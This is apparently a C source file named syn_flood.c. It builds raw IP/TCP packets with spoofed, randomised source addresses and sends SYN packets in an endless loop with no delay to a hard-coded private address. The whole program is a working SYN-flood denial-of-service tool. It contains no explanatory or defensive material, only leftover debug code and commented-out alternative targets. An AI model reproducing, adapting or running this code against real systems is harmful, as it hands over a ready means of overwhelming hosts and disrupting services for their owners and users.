/* =========================================================
 *       Filename:  syn_flood.c
 *
 *    Description:  
 *
 *         Author:  Yang Zhang, armx86@gmail.com
 *        Created:  13.02.11
 *       Revision:  
 * ======================================================== */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <colorful.h>

#include <sys/types.h>
#include <sys/time.h>
#include <sys/select.h>
#include <ifaddrs.h>

static int skfd; 
static char buf[2048];
static struct ifaddrs *ifa;

void sig_int(int signo)
{
        freeifaddrs(ifa);
        close(skfd);
        exit(0);
}

void msleep(unsigned secs)
{
        struct timeval tval;
        tval.tv_sec = secs / 1000;
        tval.tv_usec = (secs * 1000) % 1000000;
        select(0, NULL, NULL, NULL, &tval);
}

inline long getrandom(int min, int max)
{
        return ((rand() % (int)((max + 1) - min)) + min);
}

unsigned short ip_sum(unsigned short *addr, int len)
{
        register int nleft = len;
        register unsigned short *w = addr;
        register int sum = 0;
        unsigned short answer = 0;

        while (nleft > 1)
        {
                sum += *w++;
                nleft -= 2;
        }
        if (nleft == 1)
        {
                *(unsigned char *) (&answer) = *(unsigned char *) w;
                sum += answer;
        }
        sum = (sum >> 16) + (sum & 0xffff);
        sum += (sum >> 16);
        answer = ~sum;
        return (answer);
}

struct test {
#if 0
    unsigned short doff:4;
    unsigned short res1:4;
    unsigned short res2:2;
    unsigned short urg:1;
    unsigned short ack:1;
    unsigned short psh:1;
    unsigned short rst:1;
    unsigned short syn:1;
    unsigned short fin:1;
#endif
    unsigned short res1:4;
    unsigned short doff:4;
    unsigned short fin:1;
    unsigned short syn:1;
    unsigned short rst:1;
    unsigned short psh:1;
    unsigned short ack:1;
    unsigned short urg:1;
    unsigned short res2:2;
};

int main(int argc, const char *argv[])
{
        srand(time(NULL));
        int ret;
        int i;
        struct in_addr addr;
        struct sockaddr_in sin;
        struct iphdr *ih = (struct iphdr *)buf;
        struct tcphdr *th = (struct tcphdr *)(buf + sizeof(struct iphdr));
        struct ifaddrs *tmp;

        if (getifaddrs(&ifa)) {
                perror("getifaddrs: ");
        }
        for (tmp = ifa; tmp; tmp = tmp->ifa_next) {
                /* ignore loopback */
                if (tmp->ifa_addr->sa_family == AF_INET && !strncmp(tmp->ifa_name, "eth", 3)) {
                        ih->saddr = ((struct sockaddr_in *)(tmp->ifa_addr))->sin_addr.s_addr;
                        break;
                }
        }

        /* can only send msg */
        skfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
        if (skfd < 0)
                skfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
        /* herader include */
        setsockopt(skfd, IPPROTO_IP, IP_HDRINCL, "1", sizeof ("1"));
        signal(SIGINT, sig_int);

        while (1) {
                ih->version = 4;
                ih->ihl = 5;
                ih->tos = 0x00;
#define DATASIZE 10
                ih->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + DATASIZE) ;
                ih->id = htons(getrandom(1024, 65535));
                ih->frag_off = 0;
                ih->ttl = getrandom(200, 255);
                ih->protocol = 6;
                /* ih->sum = 0; */
                /* getrandom(0, 65535), no need hton */
                /* ih->saddr = getrandom(0, 65536) + (getrandom(0, 65535) << 16); */
                ih->saddr = getrandom(0, 65536) + (getrandom(0, 65535) << 8);
                /* ih->saddr = getrandom(0, 65536); */
                /* ih->saddr = 1946746880 + getrandom(0, 65535); */
                /* ih->saddr = 1711909056; */
                /* ih->saddr = 67741888; */
                /* 192.168.9.130 */
                /* ih->saddr = 2181671104; */
                /* 192.168.9.30 */
                /* ih->saddr = 503949504; */
                /* 0.0.0.128 */
                /* ih->saddr = 2147483648; */
                /* 192.168.10.10 */
                /* ih->saddr = 168470720; */
                /* 192.168.10.254 */
                /* ih->saddr = 50574016; */

                /* 192.168.9.4 */
                /* ih->daddr = 67741888; */
                /* 192.168.9.14 */
                /* ih->daddr = 235514048; */
                /* 192.168.9.141 */
                ih->daddr = 2366220480;
                /* 192.168.9.15 */
                /* ih->daddr = 252291264; */
                /* 192.168.9.117 */
                /* ih->daddr = 1963567296; */
                th->source = getrandom(0, 65535);
                th->dest = getrandom(0, 65535);
                th->seq = getrandom(0, 65535) + (getrandom(0, 65535) << 8);
                th->ack_seq = getrandom(0, 65535);
#if 0
                th->source = htons(7777);
                th->dest = htons(8888);
                th->seq = htonl(1111);
                th->ack_seq = htonl(2222);
#endif
                th->syn = 1;
                th->urg = 1;
                /* th->rst = 1; */
                th->check = 0;
                /* 4 * 5 = 20 bytes */
                th->doff = 5;
                th->urg_ptr = getrandom(0, 65535);
                /* th->window = htons(getrandom(0, 65535)); */
                th->window = getrandom(0, 65535);
                th->check = ip_sum((unsigned short *)buf, (sizeof(struct iphdr) + sizeof(struct tcphdr) + 1) & ~1);
                ih->check = ip_sum((unsigned short *)buf, (4 * ih->ihl + sizeof(struct tcphdr) + 1) & ~1);
                sin.sin_family = AF_INET;
                sin.sin_port = th->dest;
                sin.sin_addr.s_addr = ih->daddr;
                /* payload is 100 bytes */
#if 0
                struct test *p;
                p = (struct test *)((char *)th + 12);
                printf("--------------------------------------\n");
                printf("doff %u\n", p->doff);
                printf("urg %u, ack %u, psh %u\n", p->urg, p->ack, p->psh);
                printf("rst %u, syn %u, fin %u\n", p->rst, p->syn, p->fin);

                printf("doff %u\n", th->doff);
                printf("urg %u, ack %u, psh %u\n", th->urg, th->ack, th->psh);
                printf("rst %u, syn %u, fin %u\n", th->rst, th->syn, th->fin);
                printf(D_RED "0x%x\n" D_NONE, *(unsigned *)th);
                printf(D_RED "0x%x\n" D_NONE, *(unsigned *)((char *)th + 4));
                printf(D_RED "0x%x\n" D_NONE, *(unsigned *)((char *)th + 8));
                printf(D_RED "0x%x\n" D_NONE, *(unsigned *)((char *)th + 12));
                printf(D_RED "0x%x\n" D_NONE, *(unsigned *)((char *)th + 16));
                for (i = 0; i < DATASIZE; ++i) {
                        /* 40 for ip & tcp header */
                        buf[40 + i] = 0x61 + i;
                }
#endif
                /* addr.s_addr = ih->saddr; */
                /* printf("%u\t\t%s\n", ih->saddr, inet_ntoa(addr)); */
                /* ip->tot_len is net order now */
                ret = sendto(skfd, buf, 40, 0, (struct sockaddr *)&sin, sizeof(sin));
                /* ret = sendto(skfd, buf, 40 + getrandom(0, 1000), 0, (struct sockaddr *)&sin, sizeof(sin)); */
                if (ret < 0) {
                        perror("sendto ");
                } else {
                        /* fprintf(stderr, "%d bytes sent\n", ret); */
                }
                /* msleep(1); */
                /* sleep(1); */
        }
        return 0;
}
